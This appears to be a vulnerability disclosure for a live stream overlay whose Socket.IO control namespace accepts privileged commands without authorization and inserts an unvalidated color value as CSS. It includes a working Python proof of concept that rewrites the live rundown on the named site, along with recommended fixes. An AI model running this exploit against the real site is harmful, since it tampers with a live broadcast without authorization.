Todo Overlay Vulnerability Summary

Main finding: the /todo/control interface exposes privileged Socket.IO commands that allow modification of the live rundown/overlay state.

Affected Pages

  • Public overlay: https://bossbattle.b7h30.com/todo
  • Control page: https://bossbattle.b7h30.com/todo/control

Observed Socket.IO Usage

const socket = io('/todo', { transports: ['websocket'] });

socket.emit('request_state');
socket.on('state_update', render);
socket.on('ticker', applyTicker);

The control page exposes additional privileged commands:

cmd_save_rundown
cmd_jump
cmd_start_pause
cmd_skip
cmd_restart_item
cmd_restart_show

Impact

An unauthorized or weakly authorized user can modify the live overlay, including:

  • Show title
  • Section labels
  • Section subtitles
  • Durations and timers
  • Item colors
  • Active/current segment
  • Visual styling via CSS injection through the color field

Original Client-Side Issue

The overlay inserts item.color directly into an inline style:

const accentColor = item.color || '#E8A020';

div.innerHTML = `
  ...
  <span class="row__label" style="${item.status==='active' ? 'color:'+accentColor : ''}">
    ${escHtml(item.label)}
  </span>
  ...
`;

Because item.color is not validated as a real color, it can contain additional CSS declarations.

_state.items[2].color = 'red; font-size: 48px; text-shadow: 0 0 10px red';
render(_state);

This confirmed client-side visual manipulation through CSS injection.

Server-Side PoC

The same issue becomes server-side because the control page emits:

socket.emit('cmd_save_rundown', {
  show_title: _draft.show_title || _state.show_title,
  items: items,
});

Python Socket.IO PoC:

import socketio
import time

URL = "https://bossbattle.b7h30.com"
NS = "/todo"

sio = socketio.Client(reconnection=False)
state = None

@sio.on("state_update", namespace=NS)
def on_state(data):
    global state
    state = data

@sio.on("save_ok", namespace=NS)
def on_save_ok(*args):
    print("save_ok")

@sio.on("save_error", namespace=NS)
def on_save_error(data=None):
    print("save_error", data)

sio.connect(URL, namespaces=[NS], transports=["websocket"])
sio.emit("request_state", namespace=NS)

for _ in range(30):
    if state:
        break
    time.sleep(0.2)

if not state:
    raise SystemExit("No state received")

items = []
for item in state["items"]:
    items.append({
        "id": item.get("id"),
        "label": item.get("label"),
        "sublabel": item.get("sublabel", ""),
        "duration": item.get("duration"),
        "color": item.get("color"),
    })

# Example mutation
items[2]["label"] = "Just Do It"
items[2]["color"] = "red; font-size: 48px; text-shadow: 0 0 10px red"

sio.emit("cmd_save_rundown", {
    "show_title": state.get("show_title", ""),
    "items": items,
}, namespace=NS)

time.sleep(2)
sio.emit("request_state", namespace=NS)
time.sleep(1)

print("confirmed label:", state["items"][2].get("label"))
print("confirmed color:", state["items"][2].get("color"))

sio.disconnect()

Expected result:

save_ok
confirmed label: Just Do It
confirmed color: red; font-size: 48px; text-shadow: 0 0 10px red

Additional Confirmed Actions

  • Changed active item color.
  • Changed active item label.
  • Changed all section labels.
  • Changed subtitles.
  • Changed the show title.
  • Adjusted durations and timer values.
  • Used CSS injection through color to manipulate active item appearance.

Root Cause

The application trusts clients connected to the /todo Socket.IO namespace to send administrative commands. The server accepts privileged events without sufficient authorization checks.

Additionally, the color field is treated as trusted CSS and inserted directly into an inline style.

Recommended Fixes

  • Require authentication for /todo/control.
  • Enforce authorization server-side for all privileged Socket.IO events.
  • Validate color server-side, e.g. ^#[0-9a-fA-F]{6}$.
  • Do not concatenate untrusted values into inline styles.
  • Prefer DOM APIs over innerHTML.
  • Add a Content Security Policy.
  • Rotate any exposed sessions/secrets if the control endpoint was publicly accessible.
